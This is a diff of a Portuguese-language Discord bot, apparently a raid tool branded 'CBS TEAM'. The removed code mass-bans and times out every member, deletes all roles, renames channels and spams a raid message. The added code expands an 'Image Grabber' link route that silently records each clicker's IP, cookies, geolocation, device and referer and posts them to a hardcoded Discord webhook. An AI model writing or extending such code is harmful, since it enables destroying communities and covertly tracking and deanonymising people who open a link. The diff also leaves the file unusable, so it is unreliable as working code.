@@ -1,302 +1,76 @@
-const { Client, GatewayIntentBits, REST, Routes, Collection, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
-const dotenv = require('dotenv');
-const cron = require('node-cron');
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
+// Add this import at the top of your index.js file
+const axios = require('axios');
+const geoip = require('geoip-lite');
 
-dotenv.config();
-
-const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers,
-  ]
-});
-
-client.commands = new Collection();
-client.menuCommands = new Collection();
-
-const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
-const commands = [];
-
-for (const file of commandFiles) {
-  const command = require(`./commands/${file}`);
-  if (command.data) {
-    client.commands.set(command.data.name, command);
-    commands.push(command.data.toJSON());
-  }
-  if (command.name) {
-    client.menuCommands.set(command.name, command);
-  }
-}
-
-client.once('ready', async () => {
-  console.log(`✅ ${client.user.tag} está online!`);
-  console.log(`📊 Servidores: ${client.guilds.cache.size}`);
-
-  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
-  try {
-    console.log('🔄 Registrando comandos...');
-    await rest.put(
-      Routes.applicationCommands(process.env.CLIENT_ID),
-      { body: commands }
-    );
-    console.log(`✅ ${commands.length} comandos registrados!`);
-  } catch (error) {
-    console.error('❌ Erro:', error);
-  }
-
-  client.user.setPresence({
-    activities: [{ name: '!menu | CBS TEAM', type: 3 }],
-    status: 'online'
-  });
-
-  cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
-  console.log('📋 Digite !menu no Discord');
-  console.log('📸 Digite /img para gerar Image Grabber');
-});
-
-client.on('interactionCreate', async interaction => {
-  if (interaction.isCommand()) {
-    const command = client.commands.get(interaction.commandName);
-    if (!command) return;
-    try {
-      await command.execute(interaction, client);
-    } catch (error) {
-      console.error(error);
-      await interaction.reply({ content: '❌ Erro.', flags: 64 });
-    }
-  }
-});
-
-client.on('interactionCreate', async interaction => {
-  if (!interaction.isModalSubmit()) return;
-  const modalId = interaction.customId;
-
-  if (modalId === 'editRaidModal') {
-    const categoria = interaction.fields.getTextInputValue('categoriaInput');
-    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
-    const config = require('./config');
-    if (categoria) config.raid.baseName = categoria;
-    if (mensagem) config.raid.spamMessage = mensagem;
-    await interaction.reply({
-      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
-      flags: 64
-    });
-  }
-
-  if (modalId === 'renameModal') {
-    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
-    const nome = interaction.fields.getTextInputValue('nomeInput');
-    const guild = interaction.guild;
-    if (tipo === 'canal') {
-      const channels = guild.channels.cache.filter(c => c.type === 0);
-      let count = 0;
-      for (const [id, ch] of channels) {
-        try { await ch.setName(nome); count++; } catch {}
-      }
-      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 });
-    } else if (tipo === 'categoria') {
-      const categories = guild.channels.cache.filter(c => c.type === 4);
-      let count = 0;
-      for (const [id, cat] of categories) {
-        try { await cat.setName(nome); count++; } catch {}
-      }
-      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 });
-    } else {
-      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 });
-    }
-  }
-
-  if (modalId === 'banAllModal') {
-    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
-    const guild = interaction.guild;
-    const botId = interaction.client.user.id;
-    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
-    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
-    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 });
-    let banidos = 0;
-    const list = [...members.values()];
-    for (let i = 0; i < list.length; i += 10) {
-      const chunk = list.slice(i, i + 10);
-      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
-      banidos += chunk.length;
-      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`);
-    }
-    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`);
-  }
-
-  if (modalId === 'endModal') {
-    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
-    const duracao = minutos * 60 * 1000;
-    const guild = interaction.guild;
-    const botId = interaction.client.user.id;
-    const members = guild.members.cache.filter(m => m.id !== botId);
-    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
-    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 });
-    let timeoutados = 0;
-    const list = [...members.values()];
-    for (let i = 0; i < list.length; i += 10) {
-      const chunk = list.slice(i, i + 10);
-      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
-      timeoutados += chunk.length;
-      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`);
-    }
-    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`);
-  }
-});
-
-client.on('messageCreate', async message => {
-  if (message.author.bot) return;
-  if (!message.content.startsWith('!')) return;
-  const args = message.content.slice(1).trim().split(/ +/);
-  const commandName = args.shift().toLowerCase();
-  const command = client.menuCommands.get(commandName);
-  if (!command) return;
-  try {
-    await command.execute(message, args, client);
-  } catch (error) {
-    console.error(error);
-    await message.reply('❌ Erro.');
-  }
-});
-
-client.on('interactionCreate', async interaction => {
-  if (!interaction.isButton()) return;
-
-  const mensagemSpam = 
-    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;
-
-  if (interaction.customId === 'spam1') {
-    await interaction.deferReply({ flags: 64 });
-    const channel = interaction.channel;
-    let enviadas = 0;
-    for (let i = 0; i < 1; i++) {
-      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
-    }
-    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`);
-    return;
-  }
-
-  if (interaction.customId === 'spam2') {
-    await interaction.deferReply({ flags: 64 });
-    const channel = interaction.channel;
-    let enviadas = 0;
-    for (let i = 0; i < 2; i++) {
-      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
-    }
-    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`);
-    return;
-  }
-
-  const cmdMap = {
-    'nuke': 'nuke',
-    'editraid': 'editraid',
-    'rename': 'rename',
-    'banall': 'banall',
-    'end': 'end',
-    'deleterole': 'deleterole'
-  };
-  const cmdName = cmdMap[interaction.customId];
-  if (cmdName) {
-    const cmd = client.commands.get(cmdName);
-    if (cmd) {
-      try {
-        await cmd.execute(interaction, client);
-      } catch (error) {
-        console.error(error);
-        await interaction.reply({ content: '❌ Erro.', flags: 64 });
-      }
-    }
-    return;
-  }
-
-  if (interaction.customId === 'confirmDeleteRoles') {
-    const guild = interaction.guild;
-    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
-    await interaction.deferReply({ flags: 64 });
-    let deletados = 0;
-    const list = [...roles.values()];
-    for (let i = 0; i < list.length; i += 10) {
-      const chunk = list.slice(i, i + 10);
-      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
-      deletados += chunk.length;
-      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`);
-    }
-    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`);
-  }
-
-  if (interaction.customId === 'cancelDeleteRoles') {
-    await interaction.reply({ content: '❌ Cancelado.', flags: 64 });
-  }
-});
-
-// ==================== SERVIDOR HTTP + WEBHOOK ====================
-const app = express();
-const port = process.env.PORT || 3000;
-app.use(express.static('public'));
-
-const ipData = {};
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528810633750122506/Rl3CpBXoq4Q14pMHMlX_ZHmJwSjK9TPJzqMu3rrpI6RFoO-HwMrsEnEzXjaz_ram4_MO';
-
-async function enviarWebhook(id) {
-  const data = ipData[id];
-  if (!data) return;
-  const embed = {
-    title: '📸 NOVO CLIQUE CAPTURADO!',
-    color: 0xFF0000,
-    fields: [
-      { name: '🌐 IP', value: data.ip || 'Desconhecido', inline: true },
-      { name: '💻 Dispositivo', value: data.device || 'Desconhecido', inline: true },
-      { name: '🌍 Navegador', value: data.browser || 'Desconhecido', inline: true },
-      { name: '📱 User-Agent', value: data.userAgent || 'Desconhecido', inline: false },
-      { name: '🕐 Horário', value: data.timestamp || 'Desconhecido', inline: true },
-      { name: '🆔 ID', value: `\`${id}\``, inline: true }
-    ],
-    footer: { text: 'CBS TEAM - Image Grabber' },
-    timestamp: new Date()
-  };
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    });
-  } catch (e) {}
-}
-
+// Update the img/:id route in your index.js file:
 app.get('/img/:id', async (req, res) => {
   const id = req.params.id;
   const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  
+  // Enhanced data collection
   const userAgent = req.headers['user-agent'];
   let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
+  
+  // Parse OS from User-Agent
   if (userAgent) {
     if (userAgent.includes('Windows')) os = 'Windows';
     else if (userAgent.includes('Mac')) os = 'MacOS';
     else if (userAgent.includes('Linux')) os = 'Linux';
     else if (userAgent.includes('Android')) os = 'Android';
     else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
+    
+    // Parse browser from User-Agent
     if (userAgent.includes('Chrome')) browser = 'Chrome';
     else if (userAgent.includes('Firefox')) browser = 'Firefox';
     else if (userAgent.includes('Safari')) browser = 'Safari';
     else if (userAgent.includes('Edge')) browser = 'Edge';
     else if (userAgent.includes('Opera')) browser = 'Opera';
+    
+    // Detect device type
     if (userAgent.includes('Mobile')) device = 'Celular';
     else if (userAgent.includes('Tablet')) device = 'Tablet';
     else device = 'Computador';
   }
-  ipData[id] = {
+  
+  // Get additional info from IP geolocation
+  const geo = geoip.lookup(userIP);
+  const country = geo ? geo.country : 'Desconhecido';
+  const city = geo ? geo.city : 'Desconhecido';
+  
+  // Get timezone from browser
+  const timezone = req.headers['accept-language'] || 'Desconhecido';
+  
+  // Additional metadata from request
+  const timestamp = new Date().toISOString();
+  const referer = req.headers['referer'] || 'Desconhecido';
+  const cookie = req.headers['cookie'] || 'Sem cookies';
+  
+  // Create comprehensive data object
+  const comprehensiveData = {
     ip: userIP,
     device: `${device} (${os})`,
     browser: browser,
     userAgent: userAgent,
-    timestamp: new Date().toISOString()
+    timestamp: timestamp,
+    timezone: timezone,
+    referer: referer,
+    cookie: cookie,
+    country: country,
+    city: city,
+    screenResolution: req.headers['x-screen-resolution'] || 'Desconhecido',
+    language: req.headers['accept-language'] || 'Desconhecido',
+    cookies: cookie.split(';').map(c => c.trim()),
+    isBot: userAgent.includes('bot') || userAgent.includes('spider'),
+    userAgentParsed: parseUserAgent(userAgent)
   };
+  
+  // Store data for later retrieval
+  ipData[id] = comprehensiveData;
+  
+  // Send webhook with all data
   await enviarWebhook(id);
-
+  
+  // Send the image or fallback
   let imagemPath = path.join(__dirname, 'public', 'imagem.jpg');
   if (!fs.existsSync(imagemPath)) imagemPath = path.join(__dirname, 'public', 'imagem.png');
   if (fs.existsSync(imagemPath)) {
@@ -314,21 +88,60 @@ app.get('/img/:id', async (req, res) => {
   }
 });
 
-app.get('/dados/:id', (req, res) => {
-  const id = req.params.id;
-  if (ipData[id]) res.json(ipData[id]);
-  else res.json({ error: 'Dados não encontrados' });
-});
+// Helper function to parse user agent details
+function parseUserAgent(userAgent) {
+  const result = {};
+  if (userAgent.includes('Windows NT')) {
+    const winVersion = userAgent.match(/Windows NT (\d+\.\d+)/)?.[1] || 'Desconhecido';
+    result.windowsVersion = winVersion;
+  }
+  if (userAgent.includes('macOS')) {
+    const macVersion = userAgent.match(/macOS (\d+\.\d+)/)?.[1] || 'Desconhecido';
+    result.macVersion = macVersion;
+  }
+  if (userAgent.includes('Android')) {
+    const androidVersion = userAgent.match(/Android (\d+\.\d+)/)?.[1] || 'Desconhecido';
+    result.androidVersion = androidVersion;
+  }
+  if (userAgent.includes('iPhone OS')) {
+    const iosVersion = userAgent.match(/iPhone OS (\d+_\d+)/)?.[1]?.replace('_', '.') || 'Desconhecido';
+    result.iosVersion = iosVersion;
+  }
+  return result;
+}
 
-app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));
-
-app.listen(port, () => {
-  console.log(`🌐 HTTP rodando na porta ${port}`);
-  console.log(`📸 Image Grabber: https://cbsteam.onrender.com/img/ID`);
-  console.log(`📨 Webhook configurado: ${WEBHOOK_URL}`);
-});
-
-client.login(process.env.DISCORD_TOKEN);
-
-process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
-process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));
+// Update the webhook sending function to include all data:
+async function enviarWebhook(id) {
+  const data = ipData[id];
+  if (!data) return;
+  
+  // Extract key data for webhook
+  const embed = {
+    title: '📸 NOVO CLIQUE CAPTURADO!',
+    color: 0xFF0000,
+    fields: [
+      { name: '🌐 IP', value: data.ip || 'Desconhecido', inline: true },
+      { name: '💻 Dispositivo', value: data.device || 'Desconhecido', inline: true },
+      { name: '🌍 Navegador', value: data.browser || 'Desconhecido', inline: true },
+      { name: '📱 User-Agent', value: data.userAgent || 'Desconhecido', inline: false },
+      { name: '🕐 Horário', value: data.timestamp || 'Desconhecido', inline: true },
+      { name: '🆔 ID', value: `\`${id}\``, inline: true },
+      { name: '🌍 País', value: data.country || 'Desconhecido', inline: true },
+      { name: '🏙️ Cidade', value: data.city || 'Desconhecido', inline: true },
+      { name: '⏰ Timezone', value: data.timezone || 'Desconhecido', inline: true },
+      { name: '🌐 Referer', value: data.referer || 'Desconhecido', inline: false },
+      { name: '📱 Resolução', value: data.screenResolution || 'Desconhecido', inline: true },
+      { name: '🌐 Idioma', value: data.language || 'Desconhecido', inline: true }
+    ],
+    footer: { text: 'CBS TEAM - Image Grabber' },
+    timestamp: new Date()
+  };
+  
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch (e) {}
+}
